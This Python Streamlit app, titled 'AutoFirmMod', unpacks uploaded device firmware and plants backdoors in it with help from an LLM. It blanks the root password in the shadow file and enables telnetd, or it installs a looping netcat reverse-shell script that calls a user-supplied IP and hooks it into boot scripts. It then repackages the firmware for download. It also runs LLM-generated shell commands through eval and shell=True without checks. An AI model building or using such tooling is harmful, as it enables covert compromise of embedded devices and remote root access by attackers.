import streamlit as st
import os
import uuid
import subprocess
import json
import re
from dotenv import load_dotenv
from llm import get_llm_response


load_dotenv()
UPLOAD_DIR = "upload"
os.makedirs(UPLOAD_DIR, exist_ok=True)


def initialize_session_state():
    default_states = {
        "button_clicked": None,
        "button_clicked_nc": None,
        "setting_paths": None,
        "binary_paths": None,
        "user_dir": None,
        "upload_file_name": None,
        "squashfs_lines": None,
        "jffs2_lines": None,
        "shadow_path": None,
        "nc_ip": None,
        "nc_port": None,
    }

    for key, default_value in default_states.items():
        if key not in st.session_state:
            st.session_state[key] = default_value


def initialize_custom_css():
    css = """
    <style>
    .button-container {
        display: flex;
        justify-content: center;
        width: 100%;
    }
    .stButton button {
        width: 100px; 
    }
    </style>
    """
    st.markdown(css, unsafe_allow_html=True)


def directory_clean(path):
    if os.path.exists(path):
        subprocess.run(["rm", "-rf", path], check=True)


def directory_tree(user_dir, save_dir):
    with open(save_dir, "w") as save_dir:
        command = f"tree {user_dir}/rootfs | sed 's|{user_dir.replace("/", "\\/")}/||'"
        subprocess.run(command, shell=True, stdout=save_dir, stderr=save_dir)


def file_copy(src_path, dst_path):
    subprocess.run(["cp", src_path, dst_path], check=True)


def chmod_all(path):
    subprocess.run(["chmod", "777", path], check=True)


def save_uploaded_file(upload_file, user_id):
    directory_clean(f'{UPLOAD_DIR}/{user_id}')

    user_dir = os.path.join(UPLOAD_DIR, user_id)
    os.makedirs(user_dir, exist_ok=True)

    save_path = os.path.join(user_dir, upload_file.name)
    with open(save_path, "wb") as f:
        f.write(upload_file.getbuffer())

    return save_path, user_dir


def binwalk_log(save_path, log_path):
    with open(log_path, "w") as log_file:
        subprocess.run(["binwalk", save_path], stdout=log_file, stderr=log_file)


def dump_fs(file_path, output_path, offset, size=None):
    command = ["dd", f"if={file_path}", f"of={output_path}", "bs=1", f"skip={offset}"]
    if size is not None:
        command.append(f"count={size}")
    subprocess.run(command, check=True)


def button_click_callback(key):
    st.session_state.button_clicked = key


def button_click_nc_callback():
    st.session_state.button_clicked_nc = True


def check_missing_files(file_path):
    if not os.path.exists(file_path): 
        return False
    return True


def read_file(file_path):
    with open(file_path, "rb") as file:
        file_data = file.read()        
    return file_data


def find_squashfs(binwalk_log):
    squashfs_lines = []

    with open(binwalk_log, "r") as f:
        lines = f.readlines() 

    for i, line in enumerate(lines):
        if "squashfs" in line.lower():
            current_line = line.strip().split()
            squashfs_lines.append(current_line) 
            if i + 1 < len(lines) and "squashfs" not in lines[i + 1].lower():
                next_line = lines[i + 1].strip().split()
                squashfs_lines.append(next_line)

    return squashfs_lines


def find_jffs2(binwalk_log):
    jffs2_lines = []
    jffs2_list = ["zlib", "lzo", "rtime"]

    with open(binwalk_log, "r") as f:
        lines = f.readlines()

    skip = False
    for i, line in enumerate(lines):
        if "jffs2" in line.lower():
            current_line = line.strip().split()
            jffs2_lines.append(current_line) 
            skip = True 
        elif skip: 
            lower_line = line.lower()
            if any(keyword in lower_line for keyword in jffs2_list):
                continue
            else:
                next_line = line.strip().split()
                jffs2_lines.append(next_line)
                skip = False

        if i == len(lines) - 1 and skip: 
            jffs2_lines.append([]) 
            skip = False 

    return jffs2_lines


def extract_squashfs(squashfs_lines, user_dir):
    cnt = 0

    for i in range(len(squashfs_lines)):
        if squashfs_lines[i] and squashfs_lines[i][2].lower() == 'squashfs':
            offset = int(squashfs_lines[i][0])

            if not squashfs_lines[i+1]:
                size = None
            else:
                size = int(squashfs_lines[i+1][0]) - int(squashfs_lines[i][0])

            output_path = user_dir+f'/squashfs{cnt}.bin'
            dump_fs(save_path, output_path, offset, size)  
            cnt += 1
    
    os.makedirs(f'{user_dir}/rootfs', exist_ok=True) 

    extracted_squahfs= []
    for i in range(cnt):
        input_squashfs = f'{user_dir}/squashfs{i}.bin'
        output_dir = f'{user_dir}/rootfs/squashfs-root-{i}'
        os.makedirs(output_dir, exist_ok=True)

        subprocess.run(["unsquashfs", "-f", "-d", output_dir, input_squashfs], check=True)
        extracted_squahfs.append(f"squashfs-root-{i}")

    return extracted_squahfs


def extract_jffs2(jffs2_lines, user_dir):
    cnt = 0

    os.makedirs(f'{user_dir}/jffs2', exist_ok=True) 

    for i in range(len(jffs2_lines)):
        if jffs2_lines[i] and jffs2_lines[i][2].lower() == 'jffs2':
            offset = int(jffs2_lines[i][0])
            if not jffs2_lines[i+1]:
                size = None
            else:
                size = int(jffs2_lines[i+1][0]) - int(jffs2_lines[i][0])

            output_path = user_dir+f'/jffs2/jffs2-{cnt}.bin'
            dump_fs(save_path, output_path, offset, size)  
            cnt += 1
    
    extracted_jffs2 = []
    for i in range(cnt):
        input_jffs2 = f'{user_dir}/jffs2/jffs2-{i}.bin'
        output_dir = f'{user_dir}/jffs2/jffs2-{i}'
        subprocess.run(["jefferson", "-d", output_dir, input_jffs2], check=True)
        extracted_jffs2.append(f"jffs2-{i}")

    return extracted_jffs2


def overwrite_fs(src_path, start_byte, end_byte, dst_path):
    overwrite_length_check = end_byte - start_byte

    if end_byte == None:
        end_byte = len(dst_path)

    with open(src_path, 'rb') as source_file:
        src_data = source_file.read()

    overwrite_length = len(src_data)
    if overwrite_length > overwrite_length_check:
        print('Filesystem to overwrite is larger than the existing one.')
        return -1

    length = min(overwrite_length, overwrite_length_check)
    with open(dst_path, 'rb+') as target_file:
        target_file.seek(start_byte)
        target_file.write(src_data[:length])
    print(f"Overwritten {length} bytes from {start_byte} to {start_byte + length} in {dst_path}.")
    return 0


def check_mount_strings(user_dir, boot_scripts):
    mount_info = {}

    for path in boot_scripts:
        try:
            command = ["grep", "-r", "mount", f"{user_dir}/{path}"]
            result = subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            mount_info[path] = result.stdout.strip().split("\n")
        except subprocess.CalledProcessError as e:
            pass

    return mount_info


def get_squashfs_size():
    squashfs_lines = st.session_state.squashfs_lines
    fs_size = {}
    cnt = 0
    for i in range(len(squashfs_lines)):
        if squashfs_lines[i] and squashfs_lines[i][2].lower() == 'squashfs':
            start_byte = int(squashfs_lines[i][0])
            if not squashfs_lines[i+1]:
                end_byte = None
            else:
                end_byte = int(squashfs_lines[i+1][0])
            fs_size[f"squashfs-root-{cnt}"] = [start_byte, end_byte]
            cnt += 1
    return fs_size


def scan_rootfs_for_changes(user_dir):
    modified_fs = set()

    command = ["find", f"{user_dir}/rootfs", "-type", "f", "-mtime", "-1"]
    result = subprocess.run(command, check=True, capture_output=True, text=True)
    lines = result.stdout.splitlines()

    for line in lines:
        word = line.split('/')
        modified_fs.add(word[3])
    
    for fs_path in modified_fs:
        try:
            command = ["mksquashfs", f"{user_dir}/rootfs/{fs_path}", f"{user_dir}/{fs_path}-patched", "-comp", "xz"]
            result = subprocess.run(command, check=True, capture_output=True, text=True)
        except subprocess.CalledProcessError as e:
            pass
    return modified_fs


def backdoor_telnetd():
    setting_paths = st.session_state.setting_paths
    binary_paths = st.session_state.binary_paths
    user_dir = st.session_state.user_dir

    commands = get_llm_response(3, None, setting_paths, binary_paths, user_dir)
    commands = eval(commands)
    print(f'llm response - commands : {commands}')
    
    for command in commands:
        try:
            subprocess.run(command, shell=True, check=True)  
        except subprocess.CalledProcessError as e:
            pass

    if st.session_state.shadow_path:
        for boot_script in setting_paths['boot_scripts']:
            try:
                command = ["echo", f"sed -i 's/^root:[^:]*:/root::/' {st.session_state.shadow_path}", ">>", f"{user_dir}/{boot_script}"]
                subprocess.run(command, check=True) 
            except subprocess.CalledProcessError as e:
                pass
    else:
        try:
            command = f"sed -i 's/^root:[^:]*:/root::/' {user_dir}/{setting_paths['shadow']}"
            subprocess.run(command, shell=True, check=True) 
        except subprocess.CalledProcessError as e:
            pass


def backdoor_scirpt(ip, port):
    user_dir = st.session_state.user_dir
    script_lines = [
        "#!/bin/sh",
        "",
        f"remoteip={ip}",
        f"port={port}",
        "",
        "while :",
        "do",
        "    nc $remoteip $port -e /bin/sh &",
        "    sleep 30",
        "done"
    ]

    sh_file_path = f"{user_dir}/backdoor.sh"

    with open(sh_file_path, "w") as file:
        for line in script_lines:
            file.write(line + "\n")
    
    return sh_file_path


def backdoor_nc(ip, port):
    setting_paths = st.session_state.setting_paths
    binary_paths = st.session_state.binary_paths
    user_dir = st.session_state.user_dir

    sh_path = backdoor_scirpt(ip, port)
    dst_path =f'{user_dir}/rootfs/squashfs-root-0/sbin/backdoor.sh'
    file_copy(sh_path, dst_path)
    chmod_all(dst_path)

    commands = get_llm_response(5, None, setting_paths, binary_paths, user_dir, None)
    commands = eval(commands)
    print(f'llm response - commands : {commands}')
    
    for command in commands:
        try:
            subprocess.run(command, shell=True, check=True)  
        except subprocess.CalledProcessError as e:
            pass


def firmware_repackaging():
    user_dir = st.session_state.user_dir
    modified_fs = scan_rootfs_for_changes(user_dir)

    file_src = f"{user_dir}/{st.session_state.upload_file_name}"
    file_dst = f"{user_dir}/{st.session_state.upload_file_name.split('.')[0]}-modified.bin"
    file_copy(file_src, file_dst)
    fs_size = get_squashfs_size()
      
    #print(f'modified_fs : {modified_fs}')
    #print(f'fs_size : {fs_size}')

    for fs_path in modified_fs:
        modifyfs = f"{user_dir}/{fs_path}-patched"
        start_byte, end_byte = fs_size[f'squashfs-root-{fs_path[-1]}']
        if overwrite_fs(modifyfs, start_byte, end_byte, file_dst):
            st.stop()

    file_name = file_dst.split("/")[-1] 
    file_data = read_file(file_dst)
    
    return file_name, file_data



# Streamlit Main
st.title("AutoFirmMod")

initialize_custom_css()
initialize_session_state()

if st.session_state.button_clicked is None:
    upload_file = st.file_uploader("Please upload your firmware", type=["bin"])
    if upload_file is not None:
        save_path, user_dir = save_uploaded_file(upload_file, str(uuid.uuid4()))
        st.success(f"File saved successfully : {upload_file.name}")
        st.session_state.upload_file_name = upload_file.name
        st.session_state.user_dir = user_dir

        st.success(f"Running Binwalk on uploaded file...")
        binwalk_log_path = f'{user_dir}/binwalk_log.txt'
        binwalk_log(save_path, binwalk_log_path)
        
        squashfs_lines = find_squashfs(binwalk_log_path)
        st.session_state.squashfs_lines = squashfs_lines

        # jffs2_lines = find_jffs2(binwalk_log_path)
        # st.session_state.jffs2_lines = jffs2_lines
        
        if not squashfs_lines:
            st.info("squashfs Filesystem not found.")
            st.stop()
        else: 
            extracted_squahfs = extract_squashfs(squashfs_lines, user_dir)
            st.success(f"Filesystem extraction completed : {', '.join(extracted_squahfs)}")

            # extracted_jffs2 = extract_jffs2(jffs2_lines, user_dir)
            # st.success(f"Filesystem extraction completed : {', '.join(extracted_jffs2)}")

            tree_path = f'{user_dir}/tree'
            directory_tree(user_dir, tree_path)

            response_paths = get_llm_response(1, tree_path)
            setting_paths = json.loads(response_paths)
            st.session_state.setting_paths = setting_paths
            print(f'llm response - setting paths : {setting_paths}')

            mount_info = check_mount_strings(user_dir, setting_paths['boot_scripts'])
            if check_missing_files(setting_paths["shadow"]):
                st.session_state.shadow_path = get_llm_response(4, None, mount_info, None, None, setting_paths["shadow"])
                print(f'llm response - shadow path : {st.session_state.shadow_path}')

            st.markdown("---")
            st.write("### boot script & passwd")
            st.write(setting_paths)
            if st.session_state.shadow_path:
                st.warning("Shadow file could not be found.")
                st.info(f"The actual path of the shadow file: {st.session_state.shadow_path}")
                st.success(f"Shadow file path update completed.")
            st.markdown("---")

            response_paths = get_llm_response(2, tree_path)
            binary_paths = json.loads(response_paths)
            st.session_state.binary_paths = binary_paths
            print(f'llm response - binary_paths : {binary_paths}')

            st.write("### Backdoor Point List")
            st.write(binary_paths)
            st.markdown("---")

            st.write("### Select Backdoor Type")
            columns = st.columns(4) 
            for idx, (key, path) in enumerate(binary_paths.items()):
                with columns[idx]:
                    st.markdown('<div class="button-container">', unsafe_allow_html=True)
                    if path is None:
                        st.button(f"{key}", key=f"{key}_disabled", disabled=True, help="Not Available")
                    else:
                        st.button(
                            f"{key}", 
                            key=f"{key}_enabled", 
                            disabled=False, 
                            help="Available",
                            on_click=button_click_callback,
                            args=(key,) 
                        )
                    st.markdown('</div>', unsafe_allow_html=True)
                

if st.session_state.get("button_clicked"):
    st.markdown(f"### Backdoor Type : {st.session_state.button_clicked}")
    if st.session_state.button_clicked == "telnetd":
        backdoor_telnetd()
        st.success(f'Filesystem modification complete!')
    elif st.session_state.button_clicked == "nc":
        if st.session_state.button_clicked_nc == None:
            st.session_state.nc_ip = st.text_input("Enter the IP for reverse shell connection:", key="ip_input")
            st.session_state.nc_port = st.text_input("Enter the port for reverse shell connection:", key="port_input")
            st.button("Send", disabled=False, on_click=button_click_nc_callback)
            st.stop()
        elif st.session_state.button_clicked_nc == True:
            ip, port = st.session_state.nc_ip, st.session_state.nc_port
            if ip and port:
                backdoor_nc(ip, port)
                st.info(f'If the `-e` option is not available in `nc`, the reverse shell may fail to connect.')
                st.success(f'Filesystem modification complete!')   
            else:
                st.error("Please enter both IP and port.")
                st.stop()
    elif st.session_state.button_clicked == "socat":
        st.warning(f"The selected backdoor type '{st.session_state.button_clicked}' is not yet implemented.")
        st.stop()
    elif st.session_state.button_clicked == "busybox":
        st.warning(f"The selected backdoor type '{st.session_state.button_clicked}' is not yet implemented.")
        st.stop()
    
    name, data = firmware_repackaging()
    st.success(f'Firmware repackaging complete!')

    st.write("### Download Modified Firmware")
    st.write('Please click the download link below to download the modified firmware.')
    st.write('To modify a new firmware file, please refresh the page.')
    st.download_button(
            label=f"Download",
            data=data,
            file_name=name,
            mime="application/octet-stream",
    )
